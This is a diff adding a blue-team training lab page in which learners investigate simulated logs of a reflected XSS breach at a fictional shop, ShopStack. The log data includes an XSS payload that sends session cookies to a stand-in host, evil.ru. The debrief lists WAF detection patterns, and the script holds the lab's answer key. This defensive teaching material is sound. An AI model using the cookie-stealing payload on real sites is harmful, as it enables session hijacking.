@@ -1,0 +1,414 @@
+---
+layout: lab-workspace-blue.njk
+permalink: /labs/blue/investigate-shopstack/
+labCode: "BLUE-02"
+labTitle: "Investigate the ShopStack Breach"
+labDifficulty: "intermediate"
+labDescription: "ShopStack reports stolen customer sessions. You have web access logs, WAF logs, and authentication logs. Find the XSS entry point, identify affected users, and build the incident timeline."
+labCompletionText: "You successfully investigated the ShopStack breach, identified the XSS attack vector, traced the session hijacking, and built a complete incident timeline."
+---
+
+<!-- Blue Team Two-Panel Layout -->
+<div class="blue-workspace">
+
+<!-- LEFT: Mission Panel -->
+<div class="blue-mission-panel">
+  <div class="lab-panel-tabs">
+    <button class="lab-panel-tab active" data-tab="mission">Mission</button>
+    <button class="lab-panel-tab" data-tab="timeline">Timeline</button>
+    <button class="lab-panel-tab" data-tab="evidence">Evidence</button>
+  </div>
+  <div class="lab-panel-content">
+
+<div class="lab-tab-content active" data-tab-content="mission">
+  <div class="lab-section-label">Incident Report</div>
+  <div class="lab-scenario">
+    <strong>Incident #INC-4821</strong> — ShopStack's security team detected unauthorized access to three customer accounts at 06:45 UTC. Customers reported seeing orders they didn't place. The compromised sessions originated from an IP address in Eastern Europe that doesn't match any legitimate customer.
+  </div>
+  <div class="lab-scenario">
+    You have access to <strong>3 log sources</strong> spanning the incident window (02:00–07:00 UTC). Find the initial attack vector, determine the blast radius, and build a timeline for the post-incident report.
+  </div>
+
+  <div class="lab-section-label">Objectives</div>
+  <div class="lab-objective current" id="obj-attacker">
+    <div class="lab-obj-check"></div>
+    <div class="lab-obj-text">
+      <span class="lab-obj-step">Step 1 — Identify the attacker</span>
+      Find the attacker's IP address in the logs
+    </div>
+  </div>
+  <div class="lab-objective" id="obj-vector">
+    <div class="lab-obj-check"></div>
+    <div class="lab-obj-text">
+      <span class="lab-obj-step">Step 2 — Find the attack vector</span>
+      Identify the XSS payload used to steal sessions
+    </div>
+  </div>
+  <div class="lab-objective" id="obj-affected">
+    <div class="lab-obj-check"></div>
+    <div class="lab-obj-text">
+      <span class="lab-obj-step">Step 3 — Determine blast radius</span>
+      Identify which customer accounts were compromised
+    </div>
+  </div>
+  <div class="lab-objective" id="obj-timeline">
+    <div class="lab-obj-check"></div>
+    <div class="lab-obj-text">
+      <span class="lab-obj-step">Step 4 — Build the timeline</span>
+      Add at least 4 events to the incident timeline
+    </div>
+  </div>
+
+  <div class="lab-section-label" style="margin-top:24px;">Investigation Tips</div>
+  <div class="lab-scenario">
+    Start by filtering logs for <strong>unusual patterns</strong> — look for encoded characters in URLs (<code>%3C</code> = <code>&lt;</code>), requests from uncommon geolocations, and session tokens appearing from multiple IPs.
+  </div>
+</div>
+
+<div class="lab-tab-content" data-tab-content="timeline">
+  <div class="lab-section-label">Incident Timeline</div>
+  <p style="font-size:12px;color:var(--muted);margin-bottom:12px;">Click "Add to Timeline" on log entries to build your incident report.</p>
+  <div id="timeline-entries" style="min-height:200px;">
+    <div class="evidence-empty" id="timeline-empty">No events added yet. Find significant log entries and add them to the timeline.</div>
+  </div>
+</div>
+
+<div class="lab-tab-content" data-tab-content="evidence">
+  <div class="lab-section-label">Evidence Log</div>
+  <div id="evidence-log" class="evidence-list">
+    <div class="evidence-empty">Findings will appear here as you investigate.</div>
+  </div>
+</div>
+
+  </div>
+</div>
+
+<!-- RIGHT: Investigation Dashboard -->
+<div class="blue-dashboard">
+
+<!-- Log source tabs -->
+<div class="siem-header" id="siem-header">
+  <div class="siem-header-title">ShopStack Log Viewer</div>
+  <div class="siem-status-bar">
+    <div class="siem-status-item">
+      <span class="siem-status-text">Window:</span>
+      <span class="siem-status-val">02:00–07:00 UTC</span>
+    </div>
+    <div class="siem-status-item">
+      <span class="siem-status-text">Entries:</span>
+      <span class="siem-status-val" id="log-count">0</span>
+    </div>
+  </div>
+</div>
+
+<!-- Search and filter bar -->
+<div style="padding:12px 20px;background:var(--surface-1);border-bottom:1px solid var(--border);display:flex;gap:8px;align-items:center;flex-shrink:0;">
+  <input type="text" id="log-search" placeholder="Search logs... (try: script, onerror, 185.220, stolen)" autocomplete="off" style="flex:1;padding:8px 12px;background:var(--surface-0);border:1px solid var(--border);border-radius:6px;color:var(--text-1);font-family:var(--font-mono);font-size:12px;outline:none;">
+  <select id="log-source-filter" style="padding:8px 12px;background:var(--surface-0);border:1px solid var(--border);border-radius:6px;color:var(--text-1);font-family:var(--font-mono);font-size:11px;outline:none;cursor:pointer;-webkit-appearance:none;">
+    <option value="all">All Sources</option>
+    <option value="web">Web Access</option>
+    <option value="waf">WAF</option>
+    <option value="auth">Auth</option>
+  </select>
+  <select id="log-severity-filter" style="padding:8px 12px;background:var(--surface-0);border:1px solid var(--border);border-radius:6px;color:var(--text-1);font-family:var(--font-mono);font-size:11px;outline:none;cursor:pointer;-webkit-appearance:none;">
+    <option value="all">All Levels</option>
+    <option value="critical">Critical</option>
+    <option value="warn">Warning</option>
+    <option value="info">Info</option>
+  </select>
+</div>
+
+<!-- Log entries -->
+<div class="siem-content" id="log-viewer" style="flex:1;overflow-y:auto;"></div>
+
+<!-- Debrief -->
+<div class="siem-content blue-debrief" id="blue-debrief" style="display:none;flex:1;overflow-y:auto;">
+  <div class="blue-debrief-label">Debrief — ShopStack Breach Investigation</div>
+  <div class="blue-debrief-card">
+    <h3>Attack Summary</h3>
+    <p>The attacker (<code>185.220.101.34</code>, Moscow) exploited a reflected XSS vulnerability in ShopStack's search page. The search query was reflected via <code>innerHTML</code> without encoding, allowing the attacker to inject JavaScript that exfiltrated session cookies.</p>
+    <p>The attacker then used the stolen session tokens from a different IP to access three customer accounts, view their order history, and attempt to change shipping addresses.</p>
+  </div>
+  <div class="blue-debrief-card">
+    <h3>Timeline of Events</h3>
+    <p><strong>02:14</strong> — Attacker begins reconnaissance, testing search with normal queries</p>
+    <p><strong>02:18</strong> — Attacker tests HTML injection with <code>&lt;b&gt;test&lt;/b&gt;</code></p>
+    <p><strong>02:22</strong> — Attacker injects XSS payload via search: <code>&lt;img src=x onerror=...&gt;</code></p>
+    <p><strong>02:22–03:45</strong> — Malicious search link shared (likely via phishing email or social media)</p>
+    <p><strong>03:47</strong> — First victim clicks the link, session cookie stolen</p>
+    <p><strong>04:12</strong> — Second victim's session stolen</p>
+    <p><strong>04:38</strong> — Third victim's session stolen</p>
+    <p><strong>05:15</strong> — Attacker uses stolen session from Eastern European IP</p>
+    <p><strong>06:45</strong> — Security team detects unauthorized access</p>
+  </div>
+  <div class="blue-debrief-card">
+    <h3>Remediation Steps</h3>
+    <p><strong>Immediate:</strong> Invalidate all active sessions. Force password reset for affected accounts. Block attacker IP at WAF.</p>
+    <p><strong>Short-term:</strong> Fix the XSS vulnerability by encoding user input. Add Content-Security-Policy header. Deploy WAF rule for reflected XSS patterns.</p>
+    <p><strong>Long-term:</strong> Implement session binding (tie sessions to IP/User-Agent). Add automated XSS detection to CI/CD pipeline. Conduct full security audit of all user input handling.</p>
+  </div>
+  <div class="blue-debrief-card">
+    <h3>Detection improvements</h3>
+    <p><strong>SIEM rule:</strong> Alert on URL-encoded HTML characters in query parameters (<code>%3C</code>, <code>%3E</code>, <code>%22</code>) — especially in search endpoints.</p>
+    <p><strong>WAF rule:</strong> Block requests containing <code>&lt;script</code>, <code>onerror=</code>, <code>onload=</code> in URL parameters.</p>
+    <p><strong>UBA rule:</strong> Alert when a session token is used from a different IP/geo than where it was created.</p>
+  </div>
+</div>
+
+<!-- Answer submission bar -->
+<div class="siem-summary">
+  <div style="flex:1;display:flex;gap:12px;align-items:center;">
+    <input type="text" id="answer-ip" placeholder="Attacker IP" autocomplete="off" style="width:140px;padding:7px 10px;background:var(--surface-0);border:1px solid var(--border);border-radius:6px;color:var(--text-1);font-family:var(--font-mono);font-size:11px;outline:none;">
+    <input type="text" id="answer-vector" placeholder="Attack vector (e.g. XSS)" autocomplete="off" style="width:120px;padding:7px 10px;background:var(--surface-0);border:1px solid var(--border);border-radius:6px;color:var(--text-1);font-family:var(--font-mono);font-size:11px;outline:none;">
+    <input type="text" id="answer-affected" placeholder="# affected users" autocomplete="off" style="width:110px;padding:7px 10px;background:var(--surface-0);border:1px solid var(--border);border-radius:6px;color:var(--text-1);font-family:var(--font-mono);font-size:11px;outline:none;">
+  </div>
+  <button class="siem-submit-btn" id="btn-submit">Submit Findings</button>
+</div>
+
+</div><!-- /blue-dashboard -->
+</div><!-- /blue-workspace -->
+
+<style>
+.log-entry {
+  padding: 10px 20px;
+  border-bottom: 1px solid rgba(30,30,53,0.3);
+  font-family: var(--font-mono);
+  font-size: 11px;
+  line-height: 1.6;
+  cursor: pointer;
+  transition: background 100ms;
+  display: flex;
+  gap: 8px;
+  align-items: flex-start;
+}
+.log-entry:hover { background: rgba(184,165,214,0.03); }
+.log-entry.highlighted { background: rgba(232,184,77,0.06); border-left: 2px solid #e8b84d; }
+
+.log-time { color: var(--muted); white-space: nowrap; flex-shrink: 0; width: 65px; }
+.log-source-tag { font-size: 9px; padding: 1px 5px; border-radius: 3px; flex-shrink: 0; text-transform: uppercase; letter-spacing: 0.5px; }
+.log-src-web { color: var(--accent); background: rgba(184,165,214,0.1); }
+.log-src-waf { color: #e8b84d; background: rgba(232,184,77,0.1); }
+.log-src-auth { color: var(--sage); background: rgba(107,207,143,0.1); }
+.log-level { font-size: 9px; padding: 1px 5px; border-radius: 3px; flex-shrink: 0; }
+.log-lvl-info { color: var(--text-3); }
+.log-lvl-warn { color: #e8b84d; }
+.log-lvl-critical { color: #eb5757; }
+.log-msg { color: var(--text-2); flex: 1; word-break: break-word; }
+.log-msg .hl { color: #eb5757; background: rgba(235,87,87,0.1); padding: 0 3px; border-radius: 2px; }
+.log-msg .ip { color: var(--accent); }
+.log-msg .path { color: var(--sage); }
+.log-msg .session { color: #e8b84d; }
+
+.log-add-btn {
+  font-size: 9px; color: var(--accent); background: none; border: 1px solid rgba(184,165,214,0.15);
+  border-radius: 4px; padding: 2px 8px; cursor: pointer; flex-shrink: 0; opacity: 0; transition: opacity 150ms;
+  font-family: var(--font-mono);
+}
+.log-entry:hover .log-add-btn { opacity: 1; }
+.log-add-btn:hover { background: rgba(184,165,214,0.08); }
+
+.tl-entry {
+  display: flex; align-items: flex-start; gap: 10px; padding: 8px 0;
+  border-bottom: 1px solid var(--border); font-size: 11px; position: relative;
+  padding-left: 16px;
+}
+.tl-entry::before {
+  content: ''; position: absolute; left: 4px; top: 14px; width: 6px; height: 6px;
+  border-radius: 50%; background: var(--accent);
+}
+.tl-entry::after {
+  content: ''; position: absolute; left: 6px; top: 20px; bottom: -2px; width: 1px;
+  background: var(--border);
+}
+.tl-entry:last-child::after { display: none; }
+.tl-time { font-family: var(--font-mono); font-size: 10px; color: var(--muted); white-space: nowrap; flex-shrink: 0; }
+.tl-text { color: var(--text-2); flex: 1; line-height: 1.5; }
+</style>
+
+<script>
+(function() {
+  var LAB_CONFIG = {
+    id: 'blue-investigate-shopstack',
+    type: 'blue',
+    title: 'Investigate ShopStack Breach',
+    target: 'ShopStack',
+    difficulty: 'intermediate',
+    estimatedTime: 20,
+    xpReward: 250,
+    hintCost: [],
+    skills: ['investigation-breach', 'investigation-log-analysis'],
+    unlocks: [],
+    objectives: [
+      { id: 'attacker', step: 1, title: 'Identify attacker IP' },
+      { id: 'vector', step: 2, title: 'Find attack vector' },
+      { id: 'affected', step: 3, title: 'Determine blast radius' },
+      { id: 'timeline', step: 4, title: 'Build timeline' },
+    ],
+  };
+
+  var Engine = PenumbraLabs.Engine;
+  var Toast = PenumbraLabs.Toast;
+  Engine.init(LAB_CONFIG);
+
+  // Log data — tells the story of the XSS attack
+  var LOGS = [
+    { time: '02:03:12', source: 'web', level: 'info', msg: '<span class="ip">72.44.128.90</span> GET <span class="path">/</span> 200 — Chrome/124 — New York, US' },
+    { time: '02:05:44', source: 'auth', level: 'info', msg: '<span class="ip">72.44.128.90</span> LOGIN success — user: <span class="session">sarah.martinez@email.com</span> — session: <span class="session">sess_8f2a</span>' },
+    { time: '02:08:21', source: 'web', level: 'info', msg: '<span class="ip">10.0.4.55</span> GET <span class="path">/api/health</span> 200 — HealthCheck/1.0' },
+    { time: '02:11:03', source: 'web', level: 'info', msg: '<span class="ip">98.22.156.71</span> GET <span class="path">/</span> 200 — Safari/17 — Chicago, US' },
+    { time: '02:14:17', source: 'web', level: 'info', msg: '<span class="ip">185.220.101.34</span> GET <span class="path">/search?q=keyboard</span> 200 — python-requests/2.31 — Moscow, RU', suspicious: true },
+    { time: '02:14:22', source: 'web', level: 'info', msg: '<span class="ip">185.220.101.34</span> GET <span class="path">/search?q=monitor</span> 200 — python-requests/2.31 — Moscow, RU', suspicious: true },
+    { time: '02:15:01', source: 'web', level: 'info', msg: '<span class="ip">98.22.156.71</span> GET <span class="path">/search?q=headphones</span> 200 — Safari/17' },
+    { time: '02:18:33', source: 'web', level: 'warn', msg: '<span class="ip">185.220.101.34</span> GET <span class="path">/search?q=<span class="hl">%3Cb%3Etest%3C/b%3E</span></span> 200 — HTML in query parameter', suspicious: true },
+    { time: '02:18:34', source: 'waf', level: 'warn', msg: 'Rule 942100 — HTML injection attempt from <span class="ip">185.220.101.34</span> — action: <span class="hl">LOG_ONLY</span> (rule in detection mode)', suspicious: true },
+    { time: '02:22:07', source: 'web', level: 'critical', msg: '<span class="ip">185.220.101.34</span> GET <span class="path">/search?q=<span class="hl">%3Cimg%20src%3Dx%20onerror%3Dfetch(\'https://evil.ru/steal%3Fc%3D\'+document.cookie)%3E</span></span> 200', suspicious: true },
+    { time: '02:22:08', source: 'waf', level: 'critical', msg: 'Rule 941110 — XSS attack detected from <span class="ip">185.220.101.34</span> — action: <span class="hl">LOG_ONLY</span> (WAF in detection mode, NOT blocking)', suspicious: true },
+    { time: '02:30:15', source: 'web', level: 'info', msg: '<span class="ip">203.0.113.42</span> GET <span class="path">/product/3</span> 200 — Firefox/125 — London, UK' },
+    { time: '02:45:03', source: 'auth', level: 'info', msg: '<span class="ip">203.0.113.42</span> LOGIN success — user: <span class="session">james.wong@email.com</span> — session: <span class="session">sess_c41b</span>' },
+    { time: '03:10:22', source: 'web', level: 'info', msg: '<span class="ip">10.0.4.55</span> GET <span class="path">/api/health</span> 200 — HealthCheck/1.0' },
+    { time: '03:47:11', source: 'web', level: 'warn', msg: '<span class="ip">72.44.128.90</span> GET <span class="path">/search?q=<span class="hl">%3Cimg%20src%3Dx%20onerror%3Dfetch(...)%3E</span></span> 200 — Chrome/124 — <span class="hl">victim clicked malicious link</span>', suspicious: true },
+    { time: '03:47:12', source: 'waf', level: 'critical', msg: 'Outbound connection detected — <span class="session">sess_8f2a</span> (sarah.martinez) exfiltrated to <span class="hl">evil.ru</span>', suspicious: true },
+    { time: '04:12:45', source: 'web', level: 'warn', msg: '<span class="ip">203.0.113.42</span> GET <span class="path">/search?q=<span class="hl">%3Cimg%20src%3Dx%20onerror%3Dfetch(...)%3E</span></span> 200 — Firefox/125 — <span class="hl">second victim</span>', suspicious: true },
+    { time: '04:12:46', source: 'waf', level: 'critical', msg: 'Outbound connection — <span class="session">sess_c41b</span> (james.wong) exfiltrated to <span class="hl">evil.ru</span>', suspicious: true },
+    { time: '04:38:19', source: 'auth', level: 'info', msg: '<span class="ip">44.192.88.12</span> LOGIN success — user: <span class="session">lisa.chen@email.com</span> — session: <span class="session">sess_e7f3</span>' },
+    { time: '04:39:02', source: 'web', level: 'warn', msg: '<span class="ip">44.192.88.12</span> GET <span class="path">/search?q=<span class="hl">%3Cimg%20src%3Dx%20onerror%3Dfetch(...)%3E</span></span> 200 — Chrome/124 — <span class="hl">third victim</span>', suspicious: true },
+    { time: '04:39:03', source: 'waf', level: 'critical', msg: 'Outbound connection — <span class="session">sess_e7f3</span> (lisa.chen) exfiltrated to <span class="hl">evil.ru</span>', suspicious: true },
+    { time: '05:15:22', source: 'auth', level: 'critical', msg: 'Session <span class="session">sess_8f2a</span> used from <span class="hl">NEW IP: 91.215.85.17</span> (Bucharest, RO) — <span class="hl">original IP: 72.44.128.90 (New York)</span>', suspicious: true },
+    { time: '05:15:30', source: 'web', level: 'critical', msg: '<span class="ip">91.215.85.17</span> GET <span class="path">/account/orders</span> 200 — using <span class="hl">stolen session sess_8f2a</span> (sarah.martinez)', suspicious: true },
+    { time: '05:22:11', source: 'web', level: 'critical', msg: '<span class="ip">91.215.85.17</span> POST <span class="path">/account/address</span> 200 — <span class="hl">shipping address changed</span> — stolen session', suspicious: true },
+    { time: '05:45:08', source: 'auth', level: 'critical', msg: 'Session <span class="session">sess_c41b</span> used from <span class="hl">NEW IP: 91.215.85.17</span> — original IP: 203.0.113.42', suspicious: true },
+    { time: '05:45:15', source: 'web', level: 'critical', msg: '<span class="ip">91.215.85.17</span> GET <span class="path">/account/orders</span> 200 — using <span class="hl">stolen session sess_c41b</span> (james.wong)', suspicious: true },
+    { time: '06:10:33', source: 'web', level: 'info', msg: '<span class="ip">10.0.4.55</span> GET <span class="path">/api/health</span> 200 — HealthCheck/1.0' },
+    { time: '06:30:44', source: 'auth', level: 'critical', msg: 'Session <span class="session">sess_e7f3</span> used from <span class="hl">NEW IP: 91.215.85.17</span> — original IP: 44.192.88.12', suspicious: true },
+    { time: '06:45:00', source: 'auth', level: 'critical', msg: '<span class="hl">SECURITY ALERT:</span> 3 sessions accessed from unauthorized IP 91.215.85.17 — incident created', suspicious: true },
+  ];
+
+  var timelineEntries = [];
+  var viewer = document.getElementById('log-viewer');
+  var searchInput = document.getElementById('log-search');
+  var sourceFilter = document.getElementById('log-source-filter');
+  var severityFilter = document.getElementById('log-severity-filter');
+
+  function renderLogs() {
+    var search = (searchInput.value || '').toLowerCase();
+    var source = sourceFilter.value;
+    var severity = severityFilter.value;
+
+    var filtered = LOGS.filter(function(log) {
+      if (source !== 'all' && log.source !== source) return false;
+      if (severity !== 'all' && log.level !== severity) return false;
+      if (search) {
+        var text = log.msg.replace(/<[^>]+>/g, '').toLowerCase();
+        if (text.indexOf(search) === -1 && log.time.indexOf(search) === -1) return false;
+      }
+      return true;
+    });
+
+    document.getElementById('log-count').textContent = filtered.length + ' / ' + LOGS.length;
+
+    var html = '';
+    filtered.forEach(function(log, i) {
+      var origIdx = LOGS.indexOf(log);
+      html += '<div class="log-entry' + (log.suspicious ? ' highlighted' : '') + '" data-idx="' + origIdx + '">' +
+        '<span class="log-time">' + log.time + '</span>' +
+        '<span class="log-source-tag log-src-' + log.source + '">' + log.source + '</span>' +
+        '<span class="log-level log-lvl-' + log.level + '">' + log.level + '</span>' +
+        '<span class="log-msg">' + log.msg + '</span>' +
+        '<button class="log-add-btn" onclick="event.stopPropagation();addToTimeline(' + origIdx + ')">+ Timeline</button>' +
+      '</div>';
+    });
+
+    viewer.innerHTML = html || '<div style="text-align:center;padding:40px;color:var(--muted);">No logs match your filters.</div>';
+  }
+
+  searchInput.addEventListener('input', renderLogs);
+  sourceFilter.addEventListener('change', renderLogs);
+  severityFilter.addEventListener('change', renderLogs);
+
+  // Add to timeline
+  window.addToTimeline = function(idx) {
+    var log = LOGS[idx];
+    if (timelineEntries.indexOf(idx) !== -1) return;
+    timelineEntries.push(idx);
+    timelineEntries.sort(function(a, b) { return a - b; });
+
+    var container = document.getElementById('timeline-entries');
+    var empty = document.getElementById('timeline-empty');
+    if (empty) empty.remove();
+
+    // Rebuild timeline
+    var html = '';
+    timelineEntries.forEach(function(tidx) {
+      var tlog = LOGS[tidx];
+      html += '<div class="tl-entry">' +
+        '<span class="tl-time">' + tlog.time + '</span>' +
+        '<span class="tl-text">' + tlog.msg.replace(/<[^>]+>/g, '').substring(0, 120) + '</span>' +
+      '</div>';
+    });
+    container.innerHTML = html;
+
+    addEvidence('Added to timeline: [' + log.time + '] ' + log.msg.replace(/<[^>]+>/g, '').substring(0, 60));
+    Toast.show('Added to timeline', 'success');
+
+    // Check timeline objective (4+ entries)
+    if (timelineEntries.length >= 4) {
+      Engine.tryCompleteObjective('timeline');
+    }
+  };
+
+  function addEvidence(text) {
+    var log = document.getElementById('evidence-log');
+    if (log.querySelector('.evidence-empty')) log.innerHTML = '';
+    var elapsed = PenumbraLabs.Timer.getElapsed();
+    var time = PenumbraLabs.Timer.format(elapsed);
+    log.innerHTML += '<div class="evidence-item"><div class="evidence-item-time">' + time + '</div><div class="evidence-item-text">' + text + '</div></div>';
+  }
+
+  // Submit findings
+  document.getElementById('btn-submit').addEventListener('click', function() {
+    var ip = document.getElementById('answer-ip').value.trim();
+    var vector = document.getElementById('answer-vector').value.trim().toLowerCase();
+    var affected = document.getElementById('answer-affected').value.trim();
+
+    // Check attacker IP
+    if (ip === '185.220.101.34') {
+      Engine.tryCompleteObjective('attacker');
+      addEvidence('Correctly identified attacker IP: 185.220.101.34');
+    } else if (ip) {
+      Toast.show('Incorrect IP — look for the reconnaissance pattern', 'error');
+      addEvidence('Submitted incorrect attacker IP: ' + ip);
+    }
+
+    // Check attack vector
+    if (vector.indexOf('xss') !== -1 || vector.indexOf('cross-site') !== -1 || vector.indexOf('injection') !== -1) {
+      Engine.tryCompleteObjective('vector');
+      addEvidence('Correctly identified attack vector: XSS');
+    } else if (vector) {
+      Toast.show('Not quite — look at what was injected in the search queries', 'error');
+    }
+
+    // Check affected count
+    if (affected === '3') {
+      Engine.tryCompleteObjective('affected');
+      addEvidence('Correctly identified 3 affected users');
+    } else if (affected) {
+      Toast.show('Check the session exfiltration logs again', 'error');
+    }
+
+    // If all objectives complete, show debrief
+    var progress = Engine.getProgress();
+    if (progress.objectivesCompleted.length >= 4) {
+      document.getElementById('log-viewer').style.display = 'none';
+      document.getElementById('siem-header').style.display = 'none';
+      document.querySelector('.siem-summary').style.display = 'none';
+      var debrief = document.getElementById('blue-debrief');
+      debrief.style.display = '';
+      debrief.style.flex = '1';
+      debrief.style.overflowY = 'auto';
+    }
+  });
+
+  // Initial render
+  renderLogs();
+})();
+</script>
